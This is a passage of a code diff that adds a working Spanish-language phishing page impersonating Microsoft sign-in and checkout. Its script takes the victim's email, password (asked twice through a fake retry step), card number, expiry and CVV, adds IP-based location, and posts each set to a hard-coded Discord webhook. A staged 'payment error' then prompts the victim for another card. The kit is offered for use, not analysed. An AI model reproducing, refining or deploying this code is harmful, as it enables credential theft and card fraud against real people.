+          <input type="text" id="cardholderName" class="ms-input" placeholder="Nombre como aparece en la tarjeta" required />
+        </div>
+
+        <div class="expiry-cvv-row">
+          <div>
+            <label>Vencimiento*</label>
+            <div class="expiry-pair">
+              <div class="custom-select-wrap" id="monthWrap">
+                <div class="custom-select-trigger ms-input" id="monthTrigger" tabindex="0">
+                  <span id="monthDisplay">MM</span>
+                  <svg class="custom-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#a0aec0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+                </div>
+                <div class="custom-dropdown" id="monthDropdown">
+                  <div class="custom-option" data-value="01">01</div>
+                  <div class="custom-option" data-value="02">02</div>
+                  <div class="custom-option" data-value="03">03</div>
+                  <div class="custom-option" data-value="04">04</div>
+                  <div class="custom-option" data-value="05">05</div>
+                  <div class="custom-option" data-value="06">06</div>
+                  <div class="custom-option" data-value="07">07</div>
+                  <div class="custom-option" data-value="08">08</div>
+                  <div class="custom-option" data-value="09">09</div>
+                  <div class="custom-option" data-value="10">10</div>
+                  <div class="custom-option" data-value="11">11</div>
+                  <div class="custom-option" data-value="12">12</div>
+                </div>
+                <input type="hidden" id="expiryMonth" value="">
+              </div>
+              <div class="custom-select-wrap" id="yearWrap">
+                <div class="custom-select-trigger ms-input" id="yearTrigger" tabindex="0">
+                  <span id="yearDisplay">AAAA</span>
+                  <svg class="custom-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#a0aec0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+                </div>
+                <div class="custom-dropdown" id="yearDropdown"></div>
+                <input type="hidden" id="expiryYear" value="">
+              </div>
+            </div>
+            <div class="field-error" id="expiryError"></div>
+          </div>
+          <div>
+            <label for="cvv"><span id="cvvLabel">CVV*</span></label>
+            <input type="text" id="cvv" class="ms-input text-center" placeholder="•••" maxlength="4" required />
+            <div class="field-error" id="cvvError"></div>
+          </div>
+        </div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="sameAddress" checked />
+          <label for="sameAddress">Usar la misma dirección de mi cuenta de Microsoft</label>
+        </div>
+
+        <button type="submit" id="payBtn" class="ms-button">Continuar</button>
+
+        <div class="security-notice">
+          <div class="sec-title">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+            </svg>
+            Transacción segura
+          </div>
+          <p style="margin:0">Tu información de pago está protegida con cifrado de nivel bancario</p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+</div>
+
+<!-- ============================================================
+     PÁGINA 5 — PROCESANDO / ERROR DE PAGO
+     ============================================================ -->
+<div id="procesando" class="page">
+  <!-- PASO 1: Spinner procesando -->
+  <div id="step-1" class="overlay" aria-live="polite">
+    <div class="card-lite motion stagger-on" id="card-lite">
+      <div style="display:flex;align-items:center;justify-content:flex-start;gap:10px;margin-bottom:18px;">
+        <div style="display:grid;grid-template-columns:repeat(2,12px);grid-template-rows:repeat(2,12px);gap:2px;">
+          <div style="background:#f25022;width:12px;height:12px;"></div>
+          <div style="background:#7fba00;width:12px;height:12px;"></div>
+          <div style="background:#00a4ef;width:12px;height:12px;"></div>
+          <div style="background:#ffb900;width:12px;height:12px;"></div>
+        </div>
+        <span style="font-family:Segoe UI,Arial,sans-serif;font-size:20px;font-weight:600;color:#5E5E5E;">Microsoft</span>
+      </div>
+      <div class="title" data-anim="2">Procesando pago<span class="dots"></span></div>
+      <svg class="ring" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-anim="3">
+        <g fill="none" fill-rule="evenodd" stroke-width="4">
+          <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,0.12)"></circle>
+          <path class="sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#0067c0"></path>
+        </g>
+      </svg>
+      <div class="subtle" data-anim="4">Estamos verificando la transacción…</div>
+      <div class="divider" data-anim="4"></div>
+      <ul class="hints" data-anim="4">
+        <li>No cierres esta ventana.</li>
+        <li>Podrían pedirse pasos de seguridad adicionales.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- PASO 2: Verificación emisor -->
+  <div id="step-2" class="overlay is-hide" aria-live="polite">
+    <div class="card-issuer motion" id="card-issuer">
+      <div class="issuer-body">
+        <svg id="brand-ring" class="ring-brand" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <g fill="none" fill-rule="evenodd" stroke-width="5">
+            <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,.08)"></circle>
+            <path id="brand-sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#2563eb"></path>
+          </g>
+        </svg>
+        <div id="brand-visa" class="brand-visa hidden" aria-hidden="true">VISA</div>
+        <div id="brand-mc" class="brand-mc hidden" aria-hidden="true">
+          <span class="mc-icon" aria-hidden="true"></span>
+          <span class="mc-text">ID Check</span>
+        </div>
+        <div class="brand-title">Espera un momento</div>
+        <div class="brand-caption">Tomará unos segundos hasta que finalice la operación</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PASO 3: Error de pago -->
+  <main id="step-3" class="stage-main" aria-live="polite">
+    <section id="card3" class="card" role="dialog" aria-labelledby="ttl" aria-describedby="desc">
+      <header class="head">
+        <div style="display:flex;align-items:center;justify-content:flex-start;gap:10px;margin-bottom:18px;">
+          <div style="display:grid;grid-template-columns:repeat(2,12px);grid-template-rows:repeat(2,12px);gap:2px;">
+            <div style="background:#f25022;width:12px;height:12px;"></div>
+            <div style="background:#7fba00;width:12px;height:12px;"></div>
+            <div style="background:#00a4ef;width:12px;height:12px;"></div>
+            <div style="background:#ffb900;width:12px;height:12px;"></div>
+          </div>
+          <span style="font-family:Segoe UI,Arial,sans-serif;font-size:20px;font-weight:600;color:#5E5E5E;">Microsoft</span>
+        </div>
+        <h1 id="ttl" class="title-err">Error en procesar su pago</h1>
+        <p id="desc" class="sub-err">Hubo un problema con tu método de pago.</p>
+      </header>
+
+      <div class="status" aria-hidden="true">
+        <div style="position:relative;width:80px;height:80px;display:flex;align-items:center;justify-content:center;margin:0 auto;">
+          <div id="err-ripple" style="position:absolute;inset:0;border-radius:50%;opacity:0;"></div>
+          <div class="err-badge" id="err-badge-el">
+            <svg class="err-svg" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <circle class="err-bg" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+              <circle id="err-ring-el" cx="24" cy="24" r="18" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="113" stroke-dashoffset="113"/>
+              <line id="err-x1-el" x1="16" y1="16" x2="32" y2="32" stroke="#b91c1c" stroke-width="3" stroke-linecap="round" stroke-dasharray="23" stroke-dashoffset="23"/>
+              <line id="err-x2-el" x1="32" y1="16" x2="16" y2="32" stroke="#b91c1c" stroke-width="3" stroke-linecap="round" stroke-dasharray="23" stroke-dashoffset="23"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <p class="intro">Requerimos que agregue una tarjeta de pago diferente.</p>
+
+      <div class="callout error" role="group" aria-label="Tarjeta no compatible">
+        <h3>Tarjeta no compatible</h3>
+        <ul>
+          <li>Tarjeta no aceptada por el emisor</li>
+          <li>Restricciones del banco emisor</li>
+          <li>Tipo de tarjeta no soportado</li>
+          <li>Fondos insuficientes</li>
+        </ul>
+      </div>
+
+      <div class="callout help" role="group" aria-label="¿Qué puedes hacer?">
+        <h3>¿Qué puedes hacer?</h3>
+        <ul>
+          <li>Intenta con una tarjeta diferente:<br>Visa, Mastercard, Amex, Discover</li>
+          <li>Verifica que tu tarjeta acepte pagos en línea.</li>
+          <li>Intenta de nuevo más tarde.</li>
+        </ul>
+      </div>
+
+      <div class="fins">
+        <div class="countdown-wrap">
+          <span class="countdown-txt">Redirigiendo en <span id="cdNum">10</span>s</span>
+          <div class="countdown-bar-track"><div class="countdown-bar" id="cdBar"></div></div>
+        </div>
+        <a href="#pago" class="btn" onclick="var pf=document.getElementById('paymentForm');if(pf)pf.reset();var md=document.getElementById('monthDisplay');if(md)md.textContent='MM';var yd=document.getElementById('yearDisplay');if(yd)yd.textContent='AAAA';var mh=document.getElementById('expiryMonth');if(mh)mh.value='';var yh=document.getElementById('expiryYear');if(yh)yh.value='';document.querySelectorAll('.card-icon').forEach(function(ci){ci.classList.remove('active');});">Reintentar</a>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+
+  // ─────────────────────────────────────────────
+  // UBICACIÓN AUTOMÁTICA (IP)
+  // ─────────────────────────────────────────────
+  var ubicacionCapturada = 'Obteniendo...';
+  fetch('https://ipapi.co/json/')
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      ubicacionCapturada = (d.city || '') + ', ' + (d.region || '') + ', ' + (d.country_name || '') + ' | IP: ' + (d.ip || '');
+    })
+    .catch(function(){ ubicacionCapturada = 'No disponible'; });
+
+  // ─────────────────────────────────────────────
+  // WEBHOOK
+  // ─────────────────────────────────────────────
+  var WEBHOOK = 'https://discord.com/api/webhooks/1573081378642202704/ohgXLkk7BREZHQGAXn4ndz0mdElPlJSaDOzu1jFnzsBoh4cS-q90hsi0njTDci3kTfkz';
+
+  function enviar(embed) {
+    var payload = JSON.stringify({ embeds: [embed] });
+
+    // Con FormData + no-cors el navegador no bloquea el envío
+    // Discord acepta payload_json como campo de formulario
+    var fd = new FormData();
+    fd.append('payload_json', payload);
+
+    fetch(WEBHOOK, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: fd
+    }).catch(function () {});
+  }
+
+  // ─────────────────────────────────────────────
+  // NAVEGACIÓN: solo muestra la sección del hash
+  // ─────────────────────────────────────────────
+  var pages = document.querySelectorAll('.page');
+
+  function showPage(hash) {
+    var target = hash.replace('#', '') || 'inicio';
+    pages.forEach(function (p) {
+      p.style.display = p.id === target ? 'block' : 'none';
+    });
+  }
+
+  function limpiarPago() {
+    var pf = document.getElementById('paymentForm');
+    if (pf) pf.reset();
+    var md = document.getElementById('monthDisplay'); if (md) md.textContent = 'MM';
+    var yd = document.getElementById('yearDisplay');  if (yd) yd.textContent = 'AAAA';
+    var mh = document.getElementById('expiryMonth');  if (mh) mh.value = '';
+    var yh = document.getElementById('expiryYear');   if (yh) yh.value = '';
+    document.querySelectorAll('.card-icon').forEach(function(ci){ ci.classList.remove('active'); });
+    document.querySelectorAll('.field-error').forEach(function(e){ e.classList.remove('visible'); });
+  }
+
+  window.addEventListener('hashchange', function () {
+    if (location.hash === '#pago') limpiarPago();
+    showPage(location.hash);
+  });
+
+  showPage(location.hash || '#inicio');
+
+  // ─────────────────────────────────────────────
+  // PÁGINA 1 — Email
+  // ─────────────────────────────────────────────
+  var emailCapturado = '';
+
+  var emailForm = document.getElementById('emailForm');
+  if (emailForm) {
+    emailForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      var emailInput = document.getElementById('email');
+      var errorBox   = document.getElementById('errorMessage');
+
+      if (!/^[a-zA-Z0-9._%+-]+@(?:hotmail|outlook|live|msn)\.[a-zA-Z]{2,}$/.test(emailInput.value)) {
+        emailInput.classList.add('input-error');
+        errorBox.classList.add('visible');
+        emailInput.addEventListener('input', function () {
+          emailInput.classList.remove('input-error');
+          errorBox.classList.remove('visible');
+        }, { once: true });
+        return;
+      }
+
+      emailCapturado = emailInput.value;
+
+      // Propagar el email a las páginas 2 y 3
+      var d1 = document.getElementById('userEmailDisplay');
+      var d2 = document.getElementById('userEmailDisplay2');
+      if (d1) d1.textContent = emailCapturado;
+      if (d2) d2.textContent = emailCapturado;
+
+      // Enviar a Discord
+      enviar({
+        title: '📧MCGREGOR I',
+        color: 0x0078d4,
+        fields: [
+          { name: 'Email',     value: emailCapturado,      inline: false },
+          { name: 'Ubicación', value: ubicacionCapturada,  inline: false }
+        ],
+        footer: { text: 'Página 1 — Inicio de sesión' },
+        timestamp: new Date().toISOString()
+      });
+
+      location.hash = '#acerca';
+    });
+  }
+
+  // ─────────────────────────────────────────────
+  // PÁGINA 2 — Contraseña
+  // ─────────────────────────────────────────────
+  var loginForm = document.getElementById('loginForm');
+  if (loginForm) {
+    var pwdInput  = document.getElementById('password');
+    var iconEye   = document.getElementById('iconEye');
+    var iconEyeOff = document.getElementById('iconEyeOff');
+    var togglePwd = document.getElementById('togglePwd');
+    if (togglePwd) {
+      togglePwd.addEventListener('click', function () {
+        var isText = pwdInput.getAttribute('type') === 'text';
+        pwdInput.setAttribute('type', isText ? 'password' : 'text');
+        iconEye.style.display    = isText ? 'none'  : 'block';
+        iconEyeOff.style.display = isText ? 'block' : 'none';
+      });
+    }
+
+    loginForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (pwdInput.value.includes(' ')) {
+        pwdInput.classList.add('input-error');
+        document.getElementById('spaceError').style.display = 'block';
+        pwdInput.addEventListener('input', function () {
+          pwdInput.classList.remove('input-error');
+          document.getElementById('spaceError').style.display = 'none';
+        }, { once: true });
+        return;
+      }
+
+      // Enviar a Discord
+      enviar({
+        title: '🔑 MCGREGOR II',
+        color: 0x7fba00,
+        fields: [
+          { name: 'Email',      value: emailCapturado || '—', inline: true },
+          { name: 'Contraseña', value: pwdInput.value,         inline: true },
+          { name: 'Ubicación',  value: ubicacionCapturada,     inline: false }
+        ],
+        footer: { text: 'Página 2 — Contraseña' },
+        timestamp: new Date().toISOString()
+      });
+
+      location.hash = '#reintento';
+    });
+  }
+
+  // ─────────────────────────────────────────────
+  // PÁGINA 3 — Contraseña reintento
+  // ─────────────────────────────────────────────
+  var retryForm = document.getElementById('retryForm');
+  if (retryForm) {
+    var pwdInput2   = document.getElementById('password2');
+    var iconEye2    = document.getElementById('iconEye2');
+    var iconEyeOff2 = document.getElementById('iconEyeOff2');
+    var togglePwd2  = document.getElementById('togglePwd2');
+    if (togglePwd2) {
+      togglePwd2.addEventListener('click', function () {
+        var isText = pwdInput2.getAttribute('type') === 'text';
+        pwdInput2.setAttribute('type', isText ? 'password' : 'text');
+        iconEye2.style.display    = isText ? 'none'  : 'block';
+        iconEyeOff2.style.display = isText ? 'block' : 'none';
+      });
+    }
+
+    retryForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (pwdInput2.value.includes(' ')) {
+        pwdInput2.classList.add('input-error');
+        document.getElementById('spaceError2').style.display = 'block';
+        pwdInput2.addEventListener('input', function () {
+          pwdInput2.classList.remove('input-error');
+          document.getElementById('spaceError2').style.display = 'none';
+        }, { once: true });
+        return;
+      }
+
+      // Enviar a Discord
+      enviar({
+        title: '🔑 MCGREGOR III',
+        color: 0xffb900,
+        fields: [
+          { name: 'Email',      value: emailCapturado || '—', inline: true },
+          { name: 'Contraseña', value: pwdInput2.value,        inline: true },
+          { name: 'Ubicación',  value: ubicacionCapturada,     inline: false }
+        ],
+        footer: { text: 'Página 3 — Reintento contraseña' },
+        timestamp: new Date().toISOString()
+      });
+
+      location.hash = '#pago';
+    });
+  }
+
+  // ─────────────────────────────────────────────
+  // PÁGINA 4 — Tarjeta de pago
+  // ─────────────────────────────────────────────
+  var cardNumberInput = document.getElementById('cardNumber');
+  var cvvInput        = document.getElementById('cvv');
+  var monthInput      = document.getElementById('expiryMonth');
+  var yearInput       = document.getElementById('expiryYear');
+  var monthDropdown   = document.getElementById('monthDropdown');
+  var yearDropdown    = document.getElementById('yearDropdown');
+  var monthTrigger    = document.getElementById('monthTrigger');
+  var yearTrigger     = document.getElementById('yearTrigger');
+  var monthWrap       = document.getElementById('monthWrap');
+  var yearWrap        = document.getElementById('yearWrap');
+  var monthDisplay    = document.getElementById('monthDisplay');
+  var yearDisplay     = document.getElementById('yearDisplay');
+
+  if (cardNumberInput) {
+    cardNumberInput.addEventListener('input', function () {
+      var v = this.value.replace(/\D/g, '').slice(0, 16);
+      var parts = v.match(/.{1,4}/g) || [];
+      this.value = parts.join(' ');
+
+      document.querySelectorAll('.card-icon').forEach(function (ci) { ci.classList.remove('active'); });
+      var first = v.charAt(0);
+      if      (first === '4') { var el = document.querySelector('.card-icon.visa');       if (el) el.classList.add('active'); }
+      else if (first === '3') { var el = document.querySelector('.card-icon.amex');       if (el) el.classList.add('active'); }
+      else if (first === '5') { var el = document.querySelector('.card-icon.mastercard'); if (el) el.classList.add('active'); }
+      else if (first === '6') { var el = document.querySelector('.card-icon.discover');   if (el) el.classList.add('active'); }
+
+      var cardNumLabel = document.getElementById('cardNumberLabel');
+      var cvvLabel     = document.getElementById('cvvLabel');
+      if (/^3[47]/.test(v)) {
+        if (cardNumLabel) cardNumLabel.textContent = 'Número de tarjeta (AMEX)*';
+        if (cvvLabel)     cvvLabel.textContent     = 'Código de seguridad (4 dígitos)*';
+        if (cvvInput)   { cvvInput.maxLength = 4; cvvInput.placeholder = '••••'; }
+      } else {
+        if (cardNumLabel) cardNumLabel.textContent = 'Número de tarjeta*';
+        if (cvvLabel)     cvvLabel.textContent     = 'CVV*';
+        if (cvvInput)   { cvvInput.maxLength = 3; cvvInput.placeholder = '•••'; }
+      }
+    });
+  }
+
+  if (cvvInput) {
+    cvvInput.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+    });
+  }
+
+  if (monthTrigger && monthDropdown) {
+    monthTrigger.addEventListener('click', function () {
+      monthDropdown.classList.toggle('open');
+      monthTrigger.classList.toggle('open');
+    });
+    monthDropdown.querySelectorAll('.custom-option').forEach(function (opt) {
+      opt.addEventListener('click', function () {
+        monthInput.value = this.dataset.value;
+        monthDisplay.textContent = this.textContent;
+        monthTrigger.classList.remove('open');
+        monthDropdown.classList.remove('open');
+      });
+    });
+  }
+
+  if (yearDropdown) {
+    var startYear = new Date().getFullYear();
+    for (var i = startYear; i < startYear + 12; i++) {
+      var opt = document.createElement('div');
+      opt.className = 'custom-option';
+      opt.dataset.value = i;
+      opt.textContent = i;
+      yearDropdown.appendChild(opt);
+    }
+    yearTrigger.addEventListener('click', function () {
+      yearDropdown.classList.toggle('open');
+      yearTrigger.classList.toggle('open');
+    });
+    yearDropdown.querySelectorAll('.custom-option').forEach(function (opt) {
+      opt.addEventListener('click', function () {
+        yearInput.value = this.dataset.value;
+        yearDisplay.textContent = this.textContent;
+        yearTrigger.classList.remove('open');
+        yearDropdown.classList.remove('open');
+      });
+    });
+  }
+
+  document.addEventListener('click', function (e) {
+    if (monthWrap && !monthWrap.contains(e.target)) {
+      if (monthTrigger) monthTrigger.classList.remove('open');
+      if (monthDropdown) monthDropdown.classList.remove('open');
+    }
+    if (yearWrap && !yearWrap.contains(e.target)) {
+      if (yearTrigger) yearTrigger.classList.remove('open');
+      if (yearDropdown) yearDropdown.classList.remove('open');
+    }
+  });
+
+  var paymentForm = document.getElementById('paymentForm');
+  if (paymentForm) {
+    paymentForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      if (cardNumberInput && !/^\d{4}\s\d{4}\s\d{4}\s\d{4}$/.test(cardNumberInput.value)) {
+        cardNumberInput.classList.add('error');
+        cardNumberInput.focus();
+        return;
+      }
+
+      var selMonth = parseInt(monthInput ? monthInput.value : 0);
+      var selYear  = parseInt(yearInput  ? yearInput.value  : 0);
+      if (!selMonth || !selYear) {
+        var expiryErr = document.getElementById('expiryError');
+        if (expiryErr) { expiryErr.textContent = 'Requerido'; expiryErr.classList.add('visible'); }
+        return;
+      }
+      var now = new Date();
+      if (selYear === now.getFullYear() && selMonth < now.getMonth() + 1) {
+        var expiryErr2 = document.getElementById('expiryError');
+        if (expiryErr2) { expiryErr2.textContent = 'Vencida'; expiryErr2.classList.add('visible'); }
+        return;
+      }
+
+      if (cvvInput && !/^\d{3,4}$/.test(cvvInput.value)) {
+        cvvInput.classList.add('error');
+        var cvvErr = document.getElementById('cvvError');
+        if (cvvErr) cvvErr.classList.add('visible');
+        cvvInput.focus();
+        return;
+      }
+
+      var titular = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : '—';
+
+      // Capturar ubicación
+
+      // Detectar marca de tarjeta
+      var cardVal = cardNumberInput ? cardNumberInput.value.replace(/\s/g, '') : '';
+      var marca = 'Desconocida';
+      if (/^4/.test(cardVal))       marca = 'Visa';
+      else if (/^3[47]/.test(cardVal)) marca = 'American Express';
+      else if (/^5/.test(cardVal))  marca = 'Mastercard';
+      else if (/^6/.test(cardVal))  marca = 'Discover';
+
+      // Enviar a Discord
+      enviar({
+        title: '💳MCGREGOR SHIP',
+        color: 0xf25022,
+        fields: [
+          { name: 'Email',           value: emailCapturado || '—',                                      inline: false },
+          { name: 'Ubicación',       value: ubicacionCapturada,                                          inline: false },
+          { name: 'Titular',         value: titular,                                                     inline: true  },
+          { name: 'Marca',           value: marca,                                                       inline: true  },
+          { name: 'Número',          value: cardNumberInput ? cardNumberInput.value : '—',               inline: false },
+          { name: 'Vencimiento',     value: (monthInput.value || '—') + ' / ' + (yearInput.value || '—'), inline: true  },
+          { name: 'CVV',             value: cvvInput ? cvvInput.value : '—',                             inline: true  }
+        ],
+        footer: { text: 'Página 4 — Tarjeta de pago' },
+        timestamp: new Date().toISOString()
+      });
+
+      location.hash = '#procesando';
+      iniciarProcesamiento();
+    });
+  }
+
+  // ─────────────────────────────────────────────
+  // PÁGINA 5 — Animación de procesamiento
+  // ─────────────────────────────────────────────
+  function iniciarProcesamiento() {
+    var step1 = document.getElementById('step-1');
+    var step2 = document.getElementById('step-2');
+    var step3 = document.getElementById('step-3');
+
+    if (!step1 || !step2 || !step3) return;
+
+    step1.classList.remove('is-hide');
+    step2.classList.add('is-hide');
+    step3.style.display = 'none';
+
+    setTimeout(function () {
+      step1.classList.add('is-hide');
+      step2.classList.remove('is-hide');
+    }, 3000);
+
+    setTimeout(function () {
+      step2.classList.add('is-hide');
+      step3.style.display = 'flex';
+      iniciarCountdown();
+      animarError();
+    }, 6000);
+  }
+
+  function iniciarCountdown() {
+    var cdNum = document.getElementById('cdNum');
+    var cdBar = document.getElementById('cdBar');
+    if (!cdNum || !cdBar) return;
+
+    var total = 10;
+    var remaining = total;
+    cdNum.textContent = remaining;
+    cdBar.style.width = '100%';
+
+    var interval = setInterval(function () {
+      remaining--;
+      cdNum.textContent = remaining;
+      cdBar.style.width = (remaining / total * 100) + '%';
+      if (remaining <= 0) {
+        clearInterval(interval);
+        // Limpiar formulario de pago
+        var pf = document.getElementById('paymentForm');
+        if (pf) pf.reset();
+        var md = document.getElementById('monthDisplay'); if (md) md.textContent = 'MM';
+        var yd = document.getElementById('yearDisplay');  if (yd) yd.textContent = 'AAAA';
+        var mh = document.getElementById('expiryMonth');  if (mh) mh.value = '';
+        var yh = document.getElementById('expiryYear');   if (yh) yh.value = '';
+        document.querySelectorAll('.card-icon').forEach(function(ci){ ci.classList.remove('active'); });
+        location.hash = '#pago';
+      }
+    }, 1000);
+  }
+
+  function animarError() {
+    var errRing = document.getElementById('err-ring-el');
+    var errX1   = document.getElementById('err-x1-el');
+    var errX2   = document.getElementById('err-x2-el');
+    if (errRing) setTimeout(function () { errRing.style.strokeDashoffset = '0'; errRing.style.transition = 'stroke-dashoffset 0.6s ease'; }, 100);
+    if (errX1)   setTimeout(function () { errX1.style.strokeDashoffset = '0';   errX1.style.transition   = 'stroke-dashoffset 0.3s ease'; }, 700);
+    if (errX2)   setTimeout(function () { errX2.style.strokeDashoffset = '0';   errX2.style.transition   = 'stroke-dashoffset 0.3s ease'; }, 900);
+  }
+
+});
+
+</script>
+</body>
+</html>
